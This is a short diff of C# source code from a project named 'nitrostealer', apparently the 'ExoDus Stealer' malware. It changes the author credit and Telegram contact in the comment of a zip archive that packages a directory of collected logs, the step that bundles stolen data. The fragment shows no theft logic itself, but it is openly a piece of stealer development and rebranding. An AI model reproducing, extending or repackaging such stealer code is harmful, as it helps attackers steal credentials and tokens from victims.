@@ -85,8 +85,8 @@ namespace nitrostealer
                     zip.UseZip64WhenSaving = Zip64Option.Always;
                     zip.CompressionLevel = CompressionLevel.Default;
                     zip.Comment =
-                           "\n ExoDus Stealer by (FroniYT)" +
-                           "\n Contacts: https://t.me/buld_exe";
+                           "\n ExoDus Stealer by (Talant_lolz)" +
+                           "\n Contacts: https://t.me/ExoDus_stealer";
                     zip.AddDirectory(Help.LogPath);
                     zip.Save(zipArchive);
                 }
